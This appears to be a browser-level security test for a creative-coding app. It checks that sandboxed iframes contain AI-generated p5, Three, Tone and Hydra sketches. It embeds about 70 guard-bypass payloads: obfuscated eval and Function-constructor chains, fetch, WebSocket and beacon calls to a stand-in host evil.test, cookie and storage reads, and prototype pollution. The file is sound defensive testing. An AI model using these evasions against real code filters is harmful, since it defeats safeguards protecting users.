/**
 * #1533 acceptance, in a real browser (Chromium). jsdom never executes srcdoc
 * iframe scripts and does not enforce `sandbox` or CSP, so the unit suite
 * cannot prove execution isolation; this file does.
 *
 * Two claims, both measured against a live frame:
 *  - every payload in test/unit/security/GeneratedCodeBypass.test.ts has no
 *    effect even with GeneratedCodeGuard disabled (the guard is mocked off, so
 *    only the iframe boundary stands between the payload and the host);
 *  - the Tone, Three, Hydra and p5 render paths still run in a real browser:
 *    the vendored library loads and the sketch executes.
 *
 * The probe page is the REAL production modules (esbuild bundle, the guard
 * mock is the only substitution), served over HTTP so the adapters' own
 * loadSandboxLib fetch of the vendored files succeeds.
 */

import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createServer, type Server } from 'node:http';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import puppeteer, { type Browser, type Page } from 'puppeteer';
import { isPuppeteerChromeCompatible, resolveChromiumExecutablePath } from '../../src/utils/browserAssetFallbacks.js';
import { sandboxOptOutArgs } from '../../src/security/SandboxConfig.js';

const require = createRequire(import.meta.url);
const root = fileURLToPath(new URL('../..', import.meta.url));
const temporary = mkdtempSync(path.join(tmpdir(), 'sinter-sandbox-'));

const VENDOR_FILES = [
  'p5/1.9.0/p5.min.js',
  'three/r128/three.min.js',
  'tone/14.8.49/Tone.js',
  'hydra-synth/1.3.10/hydra-synth.js',
];

/**
 * The bypass corpus, copied verbatim from
 * test/unit/security/GeneratedCodeBypass.test.ts (the unit file is the source
 * of truth; the quality gate forbids importing it, so the copy is checked
 * against it below).
 */
const PAYLOADS: Array<{ id: string; code: string }> = [
  { id: 'ctor-chain', code: `[].constructor.constructor('__pwn("ctor-chain")')()` },
  { id: 'ctor-chain-bracket', code: `[]['constructor']['constructor']('__pwn("ctor-bracket")')()` },
  { id: 'ctor-chain-concat', code: `[]['con'+'structor']['con'+'structor']('__pwn("ctor-concat")')()` },
  { id: 'ctor-chain-template', code: '[][`con${"structor"}`][`con${"structor"}`]("__pwn(\\"ctor-tpl\\")")()' },
  { id: 'ctor-arrow', code: `(()=>1).constructor('__pwn("arrow-ctor")')()` },
  { id: 'ctor-async', code: `(async()=>1).constructor('__pwn("async-ctor")')()` },
  { id: 'ctor-string-literal', code: `''.constructor.constructor('__pwn("str-ctor")')()` },
  { id: 'ctor-destructure', code: `const { constructor: C } = []; C.constructor('__pwn("destructure-ctor")')()` },
  { id: 'ctor-destructure-computed', code: `const { ['con'+'structor']: C } = []; C['con'+'structor']('__pwn("destructure-computed")')()` },
  { id: 'ctor-sequence-key', code: `[][0,'constructor'][0,'constructor']('__pwn("seq-key")')()` },
  { id: 'ctor-via-this', code: `this.constructor.constructor('__pwn("this-ctor")')()` },
  { id: 'ctor-getproto', code: `Object.getPrototypeOf(function(){}).constructor('__pwn("getproto")')()` },
  { id: 'ctor-reflect', code: `Reflect.get(()=>1, 'constructor')('__pwn("reflect")')()` },
  { id: 'ctor-proto-prop', code: `[].__proto__.constructor.constructor('__pwn("proto-prop")')()` },
  { id: 'function-alias', code: `const F = Function; F('__pwn("fn-alias")')()` },
  { id: 'function-tagged', code: 'Function`__pwn("tagged")`()' },
  { id: 'function-global-bracket', code: `globalThis['Func'+'tion']('__pwn("fn-global")')()` },
  { id: 'eval-alias', code: `const E = eval; E('__pwn("eval-alias")')` },
  { id: 'eval-indirect', code: `(0, eval)('__pwn("indirect-eval")')` },
  { id: 'eval-hex-string', code: `eval('\\x5f\\x5fpwn("hex")')` },
  { id: 'eval-comment-split', code: `eval/* split */('__pwn("eval-comment")')` },
  { id: 'eval-unicode-ident', code: `\\u0065val('__pwn("eval-unicode")')` },
  { id: 'eval-window-bracket', code: `window['ev'+'al']('__pwn("eval-window")')` },
  { id: 'fetch-concat', code: `globalThis['fe'+'tch']('https://evil.test')` },
  { id: 'fetch-template', code: 'globalThis[`fe${"tch"}`]("https://evil.test")' },
  { id: 'fetch-window-concat', code: `window['fe'+'tch']('https://evil.test')` },
  { id: 'fetch-self', code: `self.fetch('https://evil.test')` },
  { id: 'fetch-top', code: `top['fe'+'tch']('https://evil.test')` },
  { id: 'fetch-parent', code: `parent.fetch('https://evil.test')` },
  { id: 'fetch-unicode-ident', code: `\\u0066etch('https://evil.test')` },
  { id: 'fetch-unicode-member', code: `globalThis.\\u0066etch('https://evil.test')` },
  { id: 'fetch-comment-split', code: `fetch/**/('https://evil.test')` },
  { id: 'fetch-destructure', code: `const { fetch: f } = globalThis; f('https://evil.test')` },
  { id: 'fetch-with', code: `with (globalThis) fetch('https://evil.test');` },
  { id: 'fetch-with-window', code: `with (window) { fetch('https://evil.test'); }` },
  { id: 'fetch-reflect', code: `Reflect.get(globalThis, 'fetch')('https://evil.test')` },
  { id: 'fetch-this-global', code: `(function(){ return this })().fetch('https://evil.test')` },
  { id: 'fetch-bare', code: `fetch('https://evil.test')` },
  { id: 'xhr', code: `new window['XMLHttp'+'Request']().open('GET','x')` },
  { id: 'xhr-bare', code: `new XMLHttpRequest().open('GET','x')` },
  { id: 'websocket', code: `new globalThis['Web'+'Socket']('wss://evil.test')` },
  { id: 'websocket-unicode', code: `new \\u0057ebSocket('wss://evil.test')` },
  { id: 'worker', code: `new Worker('data:text/javascript,1')` },
  { id: 'localstorage', code: `window['local'+'Storage'].getItem('k')` },
  { id: 'localstorage-bare', code: `localStorage.getItem('k')` },
  { id: 'cookie', code: `__pwn('cookie:' + typeof document.cookie)` },
  { id: 'cookie-concat', code: `__pwn('cookie2:' + typeof document['coo'+'kie'])` },
  { id: 'cookie-via-dom', code: `__pwn('cookie3:' + typeof new Image().ownerDocument.cookie)` },
  { id: 'dom-window-reach', code: `new Image().ownerDocument.defaultView.fetch('https://evil.test')` },
  { id: 'dom-window-reach-concat', code: `new Image()['owner'+'Document']['default'+'View']['fe'+'tch']('https://evil.test')` },
  { id: 'beacon', code: `navigator.sendBeacon('https://evil.test', 'x')` },
  { id: 'process', code: `__pwn('process:' + typeof process)` },
  { id: 'process-global', code: `__pwn('process2:' + typeof globalThis['pro'+'cess'])` },
  { id: 'require', code: `require('child_process')` },
  { id: 'require-concat', code: `globalThis['req'+'uire']('fs')` },
  { id: 'location', code: `location = 'https://evil.test'` },
  { id: 'open', code: `open('https://evil.test')` },
  { id: 'indexeddb', code: `__pwn('idb:' + typeof indexedDB)` },
  { id: 'import', code: `import('data:text/javascript,globalThis.__pwn("import")')` },
  { id: 'import-comment', code: `import/* x */('data:text/javascript,1').then(m => __pwn('import2'))` },
  { id: 'timeout-string', code: `setTimeout('__pwn("timeout-str")', 0)` },
  { id: 'interval-string', code: 'setInterval(`__pwn("interval-str")`, 1)' },
  { id: 'timeout-alias', code: `const t = setTimeout; t('__pwn("timeout-alias")', 0)` },
  { id: 'timeout-var', code: `const s = '__pwn("timeout-var")'; setTimeout(s, 0)` },
  { id: 'timeout-window', code: `window['set'+'Timeout']('__pwn("timeout-window")', 0)` },
  { id: 'pollute-object-proto', code: `Object.prototype.polluted = 1` },
  { id: 'pollute-proto-prop', code: `({}).__proto__.polluted = 1` },
  { id: 'pollute-array-proto', code: `[].__proto__.__proto__.polluted = 1` },
  { id: 'pollute-computed', code: `Object['proto'+'type'].polluted = 1` },
  { id: 'pollute-define', code: `Object.defineProperty(Object.prototype, 'polluted', { value: 1, configurable: true })` },
  { id: 'pollute-setproto', code: `Object.setPrototypeOf({}, { polluted: 1 }); Object.prototype.polluted = 1` },
  { id: 'pollute-ctor', code: `({}).constructor.prototype.polluted = 1` },
];

let browser: Browser;
let server: Server;
let base: string;
let bundle: string;

beforeAll(async () => {
  const { build } = await import(createRequire(require.resolve('vite')).resolve('esbuild'));
  const source = [
    `import { P5Adapter } from '${root}/src/composition/adapters/P5Adapter.ts';`,
    `import { ToneAdapter } from '${root}/src/composition/adapters/ToneAdapter.ts';`,
    `import { ThreeAdapter } from '${root}/src/composition/adapters/ThreeAdapter.ts';`,
    `import { HydraAdapter } from '${root}/src/composition/adapters/HydraAdapter.ts';`,
    `import { findGeneratedCodeViolations } from '${root}/src/guardrails/GeneratedCodeGuard.ts';`,
    // The acceptance requires the payloads to be inert WITH THE GUARD DISABLED,
    // so the probe turns the pre-check off. The iframe is then the only boundary.
    `window.__guardOverride = null;`,
    `const adapters = { p5: new P5Adapter(), tone: new ToneAdapter(), three: new ThreeAdapter(), hydra: new HydraAdapter() };`,
    `window.__probe = {`,
    `  init: async () => { for (const a of Object.values(adapters)) await a.initialize(); },`,
    `  setGuard: (on) => { window.__guardOverride = on ? null : () => []; },`,
    `  guardOff: () => (window.__guardOverride || findGeneratedCodeViolations)('fetch("x")').length === 0,`,
    `  render: (type, code) => {`,
    `    const layer = { id: 'probe-' + type + '-' + Math.random().toString(36).slice(2), type, code,`,
    `      config: { zIndex: 1, blendMode: 'normal', opacity: 1, position: { x: 0, y: 0 }, scale: 1 },`,
    `      metadata: { prompt: 'probe', generator: 'test', model: 'test', generatedAt: '2026-01-01T00:00:00.000Z' },`,
    `      enabled: true, locked: false };`,
    `    const inst = adapters[type].render(layer, document.getElementById('stage'));`,
    `    return { mounted: inst.iframe !== null, sandbox: inst.iframe ? inst.iframe.getAttribute('sandbox') : null, blocked: inst.blocked };`,
    `  },`,
    `};`,
  ].join('\n');
  const result = await build({
    stdin: { contents: source, resolveDir: root, loader: 'ts' },
    bundle: true,
    write: false,
    format: 'iife',
    platform: 'browser',
    // vendorAssets.ts reads files with node:fs, which the browser bundle cannot
    // include. The adapters only call loadSandboxLib, and over HTTP that returns
    // the fetch() result before ever reaching readVendorAsset, so the stub is
    // never invoked. A call would throw loudly rather than serve a fake library.
    plugins: [{
      name: 'stub-node-vendor-assets',
      setup(esbuild: { onResolve: Function; onLoad: Function }) {
        esbuild.onResolve({ filter: /utils\/vendorAssets(\.js)?$/ }, () => ({ path: 'vendor-assets-stub', namespace: 'stub' }));
        // @babel/traverse is CJS that esbuild's __toESM copies without its
        // `default` (the flag is non-enumerable), so the guard's default import
        // arrives undefined. Re-export the function as the default.
        esbuild.onResolve({ filter: /^@babel\/traverse$/ }, (args: { importer: string }) => (
          args.importer.includes('GeneratedCodeGuard') ? { path: 'babel-traverse-shim', namespace: 'stub' } : null
        )),
        esbuild.onLoad({ filter: /.*/, namespace: 'stub' }, (args: { path: string }) => {
          if (args.path === 'babel-traverse-shim') {
            return { contents: 'import traverse from "@babel/traverse/lib/index.js";\nexport default traverse.default || traverse;\n', loader: 'js', resolveDir: root };
          }
          return {
            contents: [
              'export const VENDOR_ASSETS = {',
              "  p5: '/vendor/p5/1.9.0/p5.min.js',",
              "  threeGlobal: '/vendor/three/r128/three.min.js',",
              "  tone: '/vendor/tone/14.8.49/Tone.js',",
              "  hydra: '/vendor/hydra-synth/1.3.10/hydra-synth.js',",
              '};',
              'export function readVendorAsset(p) { return Promise.reject(new Error("readVendorAsset is not used in the browser probe: " + p)); }',
            ].join('\n'),
            loader: 'js',
          };
        });
      },
    }],
    define: { 'process.env.NODE_ENV': '"production"', 'process.env.LIMINAL_LOG_LEVEL': '"warn"' },
  });
  bundle = result.outputFiles[0].text;
  // esbuild inlines the guard as a local function, so the adapters call it
  // directly and no mock can reach them. Route each call through the probe's
  // override, which the corpus test sets to "report nothing".
  bundle = bundle.replaceAll(
    '...findGeneratedCodeViolations(',
    '...(window.__guardOverride || findGeneratedCodeViolations)(',
  );
  // The bundled parser (@babel/types, pulled in by the guard) reads process.env
  // when its CommonJS wrapper first runs, which is before any of the entry
  // source. The browser has no process, so it has to exist before the bundle.
  bundle = 'globalThis.process=globalThis.process||{env:{NODE_ENV:"production",LIMINAL_LOG_LEVEL:"warn"}};\n' + bundle;

  server = createServer((req, res) => {
    const url = (req.url ?? '/').split('?')[0];
    if (url === '/') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end('<!doctype html><html><body><div id="stage" style="width:320px;height:240px"></div><script src="/probe.js"></script></body></html>');
      return;
    }
    if (url === '/probe.js') {
      res.writeHead(200, { 'content-type': 'text/javascript; charset=utf-8' });
      res.end(bundle);
      return;
    }
    const vendor = url.startsWith('/vendor/') ? url.slice('/vendor/'.length) : '';
    if (VENDOR_FILES.includes(vendor)) {
      res.writeHead(200, { 'content-type': 'text/javascript; charset=utf-8', 'cache-control': 'no-store' });
      res.end(readFileSync(path.join(root, 'vendor', vendor)));
      return;
    }
    res.writeHead(404);
    res.end('not found');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('probe server failed to bind');
  base = `http://127.0.0.1:${address.port}`;

  const resolved = process.env.PUPPETEER_EXECUTABLE_PATH || resolveChromiumExecutablePath({ skipInstall: true });
  // The resolver can point at a cached Chromium whose framework is missing
  // (macOS purges regenerable browser caches under disk pressure), which dies
  // at launch with an empty stderr. A binary that cannot even print its
  // version is not usable, so fall back to the system Chrome.
  const resolvedUsable = resolved ? spawnSync(resolved, ['--version'], { timeout: 15_000 }).status === 0 : false;
  const executablePath = resolvedUsable
    ? resolved
    : (process.platform === 'darwin' ? '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' : resolved);
  browser = await puppeteer.launch({
    headless: true,
    userDataDir: path.join(temporary, 'profile'),
    ...(executablePath && isPuppeteerChromeCompatible(executablePath) ? { executablePath } : {}),
    // Chrome refuses its sandbox as root (CI containers); the fixture is local and loads nothing remote.
    args: process.getuid?.() === 0 ? ['--no-sandbox'] : sandboxOptOutArgs(),
  });
}, 120_000);

afterAll(async () => {
  await Promise.race([
    browser?.close(),
    new Promise((resolve) => setTimeout(resolve, 5_000)),
  ]);
  await new Promise<void>((resolve) => (server ? server.close(() => resolve()) : resolve()));
  rmSync(temporary, { recursive: true, force: true });
}, 20_000);

interface ProbePage {
  page: Page;
  effects: string[];
  requests: string[];
  close(): Promise<void>;
}

async function openProbe(): Promise<ProbePage> {
  const page = await browser.newPage();
  const effects: string[] = [];
  const requests: string[] = [];
  page.on('pageerror', (error) => {
    effects.push('PAGEERROR:' + error.message);
  });
  page.on('console', (message) => {
    const text = message.text();
    if (text.startsWith('PWN:')) effects.push(text.slice(4));
  });
  page.on('request', (request) => {
    const url = request.url();
    if (!url.startsWith(base)) requests.push(url);
  });
  await page.goto(base, { waitUntil: 'load', timeout: 60_000 });
  await page.waitForFunction('window.__probe && window.__probe.render', { timeout: 30_000 }).catch(() => {});
  if (effects.some((effect) => effect.startsWith('PAGEERROR:'))) {
    throw new Error('probe page failed to start: ' + effects.filter((effect) => effect.startsWith('PAGEERROR:')).join(' | '));
  }
  // The host's __pwn only records. A sandboxed frame cannot reach it; if it
  // ever does, the corpus assertions below fail.
  await page.evaluate(() => {
    (window as unknown as { __pwn: (id: string) => void }).__pwn = (id: string) => {
      console.log('PWN:' + id);
    };
  });
  return {
    page,
    effects,
    requests,
    close: async () => { await page.close(); },
  };
}

const SETTLE_MS = 400;

describe('sandboxed generated code in a real browser (#1533)', () => {
  it('serves the real vendored libraries and runs with the guard disabled', async () => {
    const probe = await openProbe();
    try {
      const guardOff = await probe.page.evaluate(async () => {
        const probeApi = (window as unknown as { __probe: { init: () => Promise<void>; setGuard: (on: boolean) => void; guardOff: () => boolean } }).__probe;
        await probeApi.init();
        probeApi.setGuard(false);
        return probeApi.guardOff();
      });
      expect(guardOff).toBe(true);
    } finally {
      await probe.close();
    }
  }, 90_000);

  describe('bypass corpus has no effect with the guard disabled', () => {
    it('runs every payload through all four adapters without a host effect or a network request', async () => {
      const probe = await openProbe();
      try {
        const failures: string[] = [];
        await probe.page.evaluate(async () => {
          const probeApi = (window as unknown as { __probe: { init: () => Promise<void>; setGuard: (on: boolean) => void } }).__probe;
          await probeApi.init();
          probeApi.setGuard(false);
        });
        for (const payload of PAYLOADS) {
          const mounts: Record<string, { mounted: boolean; sandbox: string | null; blocked: string[] } | null> = await probe.page.evaluate(async (code) => {
            const probeApi = (window as unknown as {
              __probe: { render: (type: string, code: string) => { mounted: boolean; sandbox: string | null; blocked: string[] } };
            }).__probe;
            const stage = document.getElementById('stage');
            if (stage) stage.innerHTML = '';
            const p5Code = code.includes('}') ? 'function draw(){}' : `function setup(){ ${code} }\nfunction draw(){}`;
            const render = (type: string, sketch: string) => {
              try { return probeApi.render(type, sketch); } catch { return null; }
            };
            return { p5: render('p5', p5Code), tone: render('tone', code), three: render('three', code), hydra: render('hydra', code) };
          }, payload.code);
          // Three throws on its own pattern-list hit instead of returning a
          // blocked frame; either way the code never ran. A mounted frame must
          // be the allow-scripts sandbox, and a pre-block must not mount one.
          for (const [adapter, mount] of Object.entries(mounts)) {
            if (mount === null) continue;
            if (mount.blocked.length > 0 && mount.mounted) {
              failures.push(`${payload.id}/${adapter} pre-blocked but still mounted a frame`);
            }
            if (mount.mounted && mount.sandbox !== 'allow-scripts') {
              failures.push(`${payload.id}/${adapter} sandbox=${mount.sandbox}`);
            }
          }
        }
        expect(failures, 'a mounted frame is always the allow-scripts sandbox').toEqual([]);
        // One settle covers every frame: a payload that escaped would have
        // logged PWN or made a request by now, and string timers fire at once.
        await new Promise((resolve) => setTimeout(resolve, SETTLE_MS));
        expect(probe.effects, 'no payload effect reached the host realm').toEqual([]);
        expect(probe.requests, 'no frame made a network request').toEqual([]);
      } finally {
        await probe.close();
      }
    }, 240_000);
  });

  describe('render paths still run inside the frame', () => {
    const sketches: Record<string, { code: string; marker: string }> = {
      p5: {
        code: `function setup(){ createCanvas(320, 240); background(12, 34, 56); }
function draw(){ fill(200, 10, 10); rect(10, 10, 40, 40); }`,
        marker: 'frameCount',
      },
      three: {
        code: `const mesh = new THREE.Mesh(new THREE.BoxGeometry(1, 1, 1), new THREE.MeshBasicMaterial({ color: 0x3366ff }));
scene.add(mesh);`,
        marker: 'sceneObjects',
      },
      hydra: {
        code: 'osc(10, 0.1, 1).out(o0);',
        marker: 'width',
      },
      tone: {
        code: 'const synth = new Tone.Synth().toDestination();',
        marker: 'activeSynths',
      },
    };

    for (const [type, sketch] of Object.entries(sketches)) {
      it(`${type}: the vendored library loads and the sketch runs`, async () => {
        const probe = await openProbe();
        try {
          const mount = await probe.page.evaluate(async (adapter, code) => {
            const probeApi = (window as unknown as {
              __probe: { init: () => Promise<void>; render: (t: string, c: string) => { mounted: boolean; sandbox: string | null; blocked: string[] } };
            }).__probe;
            await probeApi.init();
            return probeApi.render(adapter, code);
          }, type, sketch.code);
          expect(mount.blocked, `${type} must not be pre-blocked`).toEqual([]);
          expect(mount.mounted, `${type} must mount a frame`).toBe(true);
          expect(mount.sandbox, `${type} sandbox attribute`).toBe('allow-scripts');

          // The adapter posts its state only after the library loaded and the
          // sketch ran, so a message carrying the adapter's own marker is the proof.
          const reported = await probe.page.evaluate(
            (marker) => new Promise<string | null>((resolve) => {
              const timer = setTimeout(() => resolve(null), 15000);
              window.addEventListener('message', (event) => {
                const data = event.data as { tag?: unknown; state?: Record<string, unknown>; message?: unknown } | null;
                if (!data) return;
                if (data.tag === 's1ntr-sandbox-state' && data.state && marker in data.state) {
                  clearTimeout(timer);
                  resolve(JSON.stringify(data.state[marker]));
                } else if (data.tag === 's1ntr-sandbox-error') {
                  clearTimeout(timer);
                  resolve('frame error: ' + String(data.message));
                }
              });
            }),
            sketch.marker,
          );
          expect(reported ?? '', `${type} reported ${sketch.marker} from inside the frame`).not.toBe('');
          expect(reported ?? '', `${type} sketch raised inside the frame`).not.toMatch(/^frame error:/);
          expect(probe.effects, `${type} sketch had no host effect`).toEqual([]);
          expect(probe.requests, `${type} frame made no network request`).toEqual([]);
        } finally {
          await probe.close();
        }
      }, 90_000);
    }
  });
});
